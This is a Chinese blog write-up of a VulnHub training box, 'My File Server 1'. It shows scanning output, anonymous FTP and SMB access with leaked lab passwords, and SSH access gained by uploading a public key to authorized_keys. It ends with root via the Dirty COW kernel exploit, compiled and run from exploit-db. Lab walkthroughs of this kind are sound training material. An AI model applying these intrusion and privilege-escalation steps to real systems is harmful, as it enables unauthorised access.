---
title: "VulnHub-MY FILE SERVER 1"
layout: post
date: 2021-12-08 13:50
image: 
headerImage: false
tag:
- web
- vulnhub
category: blog
author: NoThxJ
description: VulnHub 
---

环境下载地址：

<https://www.vulnhub.com/entry/my-file-server-1,432/>

![27](https://havocykp.github.io/assets/images/27.png)

环境搭建运行（VirtualBox）：

![28](https://havocykp.github.io/assets/images/28.png)

1. 使用Nmap探测该虚拟机的IP：

网上的帖子里用 Netdiscover，但是kali中没有探测到

因为我这里的网卡设置的是桥接到物理网卡，所以和物理机同段；探测时只需要扫描物理机的网段即可识别虚拟机的IP

![29](https://havocykp.github.io/assets/images/29.png)

nmap 探测存活主机的方法总结：

https://blog.csdn.net/weixin_39624774/article/details/111282245

命令：nmap -sP 192.168.2.0/24 探测整个网段存活主机，根据主机名识别 fileserver

IP为：192.168.2.117

![30](https://havocykp.github.io/assets/images/30.png)

2. 信息收集

① 命令：nmap -A 1921.68.2.117 （综合扫描）

```javascript
kali@kali:~$ nmap -A 192.168.2.117
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-29 12:02 EDT
Nmap scan report for fileserver.lan (192.168.2.117)
Host is up (0.036s latency).
Not shown: 908 filtered ports, 85 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.193
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)
|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)
|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: My File Server
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      41953/udp6  nlockmgr
|   100021  1,3,4      51379/tcp6  nlockmgr
|   100021  1,3,4      51635/tcp   nlockmgr
|   100021  1,3,4      52956/udp   nlockmgr
|   100024  1          34896/tcp   status
|   100024  1          45629/udp6  status
|   100024  1          51527/udp   status
|   100024  1          57655/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
2049/tcp open  nfs_acl     3 (RPC #100227)
2121/tcp open  ftp         ProFTPD 1.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
Service Info: Host: FILESERVER; OS: Unix

Host script results:
|_clock-skew: mean: -1h50m01s, deviation: 3h10m30s, median: -2s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.1)
|   Computer name: localhost
|   NetBIOS computer name: FILESERVER\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2021-08-29T21:33:39+05:30
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-29T16:03:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.86 seconds

```

通过扫描发现，开放80端口，访问：[http://192.168.2.117:80/](http://192.168.2.117/) 

查看源码没发现可用信息

![31](https://havocykp.github.io/assets/images/31.png)

扫描结果中显示，可匿名登录FTP

```javascript
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

登录成功

账号：anonymous

密码：guest

![32](https://havocykp.github.io/assets/images/32.png)

Nikto工具介绍：

https://zhuanlan.zhihu.com/p/124246499

② Nikto 扫描

命令：nikto -h 192.168.2.117

发现一些文件存在

```javascript
kali@kali:~$ nikto -h 192.168.2.117
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.2.117
+ Target Hostname:    192.168.2.117
+ Target Port:        80
+ Start Time:         2021-08-29 12:17:59 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /readme.txt: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-08-29 12:18:46 (GMT-4) (47 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

访问：http://192.168.2.117/readme.txt 

显示内容如下，这个密码作用是？？？

![33](https://havocykp.github.io/assets/images/33.png)

③ 使用smbmap对smb信息枚举（枚举共享盘符）

注：SMBMap允许用户枚举整个域中的samba共享驱动器。列出共享驱动器、驱动器权限、共享内容、上传/下载功能、文件名自动下载模式匹配，甚至执行远程命令。

命令: smbmap -H 192.168.2.117

![34](https://havocykp.github.io/assets/images/34.png)

直接访问smb共享目录：

只有smbdata文件可访问

![35](https://havocykp.github.io/assets/images/35.png)

![36](https://havocykp.github.io/assets/images/36.png)

查看该文件属性：可读可写

![37](https://havocykp.github.io/assets/images/37.png)

使用smbclient连接

命令：smbclient //192.168.2.117/sbmdata

输入密码：rootroot1 登录成功

![38](https://havocykp.github.io/assets/images/38.png)

查看目录下的文件

命令：ls

![39](https://havocykp.github.io/assets/images/39.png)

下载文件看看有没有重要帮助信息

命令：smb: \> get secure

![40](https://havocykp.github.io/assets/images/40.png)

查看下载的 secure文件

命令：cat secure

发现新增用户：smbuser

密码：chauthtok

![41](https://havocykp.github.io/assets/images/41.png)

尝试账号/密码ssh登录

登录失败，无法访问，只能用私钥才能访问

![42](https://havocykp.github.io/assets/images/42.png)

尝试用ftp登录，使用密码：chauthtok 登录失败，使用密码：rootroot1 登录成功

![43](https://havocykp.github.io/assets/images/43.png)

解决ftp输入命令显示 500 Illegal PORT command

解决方法链接：https://www.cnblogs.com/linuxws/p/11006293.html

第一步：quote pasv

第二步：passive

查看ssh配置文件，发现用户秘钥文件

![44](https://havocykp.github.io/assets/images/44.png)

将其下载查看

ftp> get sshd_config

![45](https://havocykp.github.io/assets/images/45.png)

命令：vim sshd_config

![46](https://havocykp.github.io/assets/images/46.png)

在 smbuser用户下创建文件，伪造公钥和私钥，创建连接

![47](https://havocykp.github.io/assets/images/47.png)

生成公钥

创建公钥和私钥

命令：ssh-Keygen-t rsa

![48](https://havocykp.github.io/assets/images/48.png)

使用命令将公钥拷贝至 用户根目录

![49](https://havocykp.github.io/assets/images/49.png)

上传公钥

上传公钥至 .ssh/authorized_keys目录下

![50](https://havocykp.github.io/assets/images/50.png)

ssh远程登录，直接登录成功，不需要输入密码

![51](https://havocykp.github.io/assets/images/51.png)

提权获取信息

查看内核版本，利用脏牛（Dirty COW）提权：CVE-2016-5195 脏牛内核提权漏洞

![52](https://havocykp.github.io/assets/images/52.png)

命令：searchsploit dirty

![53](https://havocykp.github.io/assets/images/53.png)

搜索具体的文件路径：

命令：searchsploit -p 40616.c

复制文件到根目录：

命令：cp /usr/share/exploitdb/exploits/linux/local/40616.c ./

![54](https://havocykp.github.io/assets/images/54.png)

将脏牛文件上传到tmp目录下

![55](https://havocykp.github.io/assets/images/55.png)

在smbuser用户登录下，编译运行脏牛脚本

命令：gcc -pthread 40616.c -o dirty -lcrypt

![56](https://havocykp.github.io/assets/images/56.png)

查看生成的脚本并赋予权限

![57](https://havocykp.github.io/assets/images/57.png)

开始执行

命令：[smbuser@fileserver tmp]$ ./dirty 

提权成功

![58](https://havocykp.github.io/assets/images/58.png)

